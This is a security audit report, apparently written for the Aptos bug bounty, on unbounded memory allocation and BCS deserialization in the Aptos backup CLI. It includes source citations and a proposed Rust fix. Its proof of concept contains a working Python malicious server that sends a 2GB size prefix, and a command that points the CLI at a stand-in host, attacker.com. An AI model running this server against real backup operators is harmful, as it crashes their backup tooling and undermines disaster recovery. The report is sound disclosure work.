# Audit Report

## Title
Memory Exhaustion in Backup CLI via Unbounded BCS Deserialization

## Summary
The backup CLI's `read_record_bytes()` function allocates memory based on an untrusted 32-bit size prefix without validation, and `parse_key()` deserializes potentially unbounded `StateKey/StateValue` data. This allows a malicious backup service to trigger memory exhaustion and crash the backup process.

## Finding Description
The vulnerability exists in two critical locations:

1. **Unbounded Memory Allocation**: [1](#0-0) 

The `read_record_bytes()` function reads a u32 size prefix from the network stream and immediately allocates a buffer of that size (up to 4GB) without any validation or size limits.

2. **Unbounded Deserialization**: [2](#0-1) 

The `parse_key()` function deserializes the entire `(StateKey, StateValue)` tuple without size checks. Both types contain unbounded byte arrays that can be arbitrarily large.

3. **Attack Surface**: [3](#0-2) 

The backup service address is user-configurable via `--backup-service-address`, with no authentication or TLS by default (HTTP on localhost:6186).

**Attack Flow:**
- Attacker operates a malicious HTTP server or compromises/MITMs the legitimate backup service
- Operator configures backup CLI to connect to malicious endpoint (via misconfiguration, DNS poisoning, or typo)
- Malicious server responds with crafted state snapshot chunks containing huge size prefixes (e.g., 2GB+)
- `read_record_bytes()` allocates massive buffer causing memory exhaustion
- If memory allocation succeeds, `bcs::from_bytes()` attempts to deserialize huge `StateValue` with multi-GB `data: Bytes` field
- Process crashes due to OOM

**Broken Invariant:** Resource Limits (Invariant #9) - "All operations must respect gas, storage, and computational limits." The code allocates unbounded memory without validation.

## Impact Explanation
**Severity: High** per Aptos bug bounty criteria ("API crashes").

The backup CLI crashes when processing malicious responses, causing:
- **Denial of Service** of backup operations
- Potential validator node slowdown if backup runs on same machine and exhausts system memory
- Inability for operators to create backups, compromising disaster recovery

While legitimate state values are limited to 1MB by gas schedule [4](#0-3) , the backup CLI doesn't validate these limits when receiving data over the network.

## Likelihood Explanation
**Likelihood: Medium**

The attack requires:
1. Operator misconfiguration of `--backup-service-address` (typo, DNS poisoning, social engineering)
2. OR man-in-the-middle attack on HTTP connection
3. OR compromise of legitimate backup service

However, the attack becomes realistic because:
- No authentication mechanism to verify backup service identity
- Default HTTP (not HTTPS) connection
- Operators commonly use remote backup services
- DNS poisoning and typos are common operational errors

## Recommendation
Implement multiple defense layers:

1. **Add size validation in `read_record_bytes()`:**
```rust
const MAX_RECORD_SIZE: usize = 2 << 20; // 2MB, larger than max_bytes_per_write_op

async fn read_record_bytes(&mut self) -> Result<Option<Bytes>> {
    // ... existing code ...
    let record_size = u32::from_be_bytes(size_buf.as_ref().try_into()?) as usize;
    
    // ADDED: Validate size
    if record_size > MAX_RECORD_SIZE {
        bail!("Record size {} exceeds maximum allowed size {}", record_size, MAX_RECORD_SIZE);
    }
    
    // ... rest of function ...
}
```

2. **Add authentication/TLS for backup service connections**
3. **Validate deserialized StateValue size after BCS parsing**
4. **Document security implications of custom backup service addresses**

## Proof of Concept

**Malicious Server (Python):**
```python
from http.server import HTTPServer, BaseHTTPRequestHandler
import struct

class MaliciousHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if 'state_snapshot_chunk' in self.path:
            self.send_response(200)
            self.send_header('Content-Type', 'application/octet-stream')
            self.end_headers()
            
            # Send malicious record with 2GB size prefix
            size = struct.pack('>I', 2 * 1024 * 1024 * 1024)
            self.wfile.write(size)
            # Server can close connection or send garbage
            self.wfile.write(b'\x00' * 1000)

HTTPServer(('0.0.0.0', 6186), MaliciousHandler).serve_forever()
```

**Trigger Attack:**
```bash
# Run malicious server on attacker.com:6186
# Operator runs backup CLI
aptos-backup-cli state-snapshot \
  --backup-service-address http://attacker.com:6186 \
  --state-snapshot-epoch 100
  
# Result: Backup CLI attempts to allocate 2GB, likely crashes with OOM
```

## Notes
This vulnerability demonstrates insufficient input validation on network-received data in operational tooling. While the legitimate AptosDB data source enforces size limits, the backup CLI trusts all data from any configured endpoint without validation or authentication. Defense-in-depth principles require validation at trust boundaries, which is missing here.

### Citations

**File:** storage/backup/backup-cli/src/utils/read_record_bytes.rs (L54-61)
```rust
        let record_size = u32::from_be_bytes(size_buf.as_ref().try_into()?) as usize;
        if record_size == 0 {
            return Ok(Some(Bytes::new()));
        }

        // read record
        let mut record_buf = BytesMut::with_capacity(record_size);
        self.read_full_buf_or_none(&mut record_buf).await?;
```

**File:** storage/backup/backup-cli/src/backup_types/state_snapshot/backup.rs (L166-169)
```rust
    fn parse_key(record: &[u8]) -> Result<HashValue> {
        let (key, _): (StateKey, StateValue) = bcs::from_bytes(record)?;
        Ok(key.hash())
    }
```

**File:** storage/backup/backup-cli/src/utils/backup_service_client.rs (L24-30)
```rust
    #[clap(
        long = "backup-service-address",
        default_value = "http://localhost:6186",
        help = "Backup service address. By default a Aptos Node runs the backup service serving \
        on tcp port 6186 to localhost only."
    )]
    pub address: String,
```

**File:** aptos-move/aptos-gas-schedule/src/gas_schedule/transaction.rs (L154-157)
```rust
            max_bytes_per_write_op: NumBytes,
            { 5.. => "max_bytes_per_write_op" },
            1 << 20, // a single state item is 1MB max
        ],
```
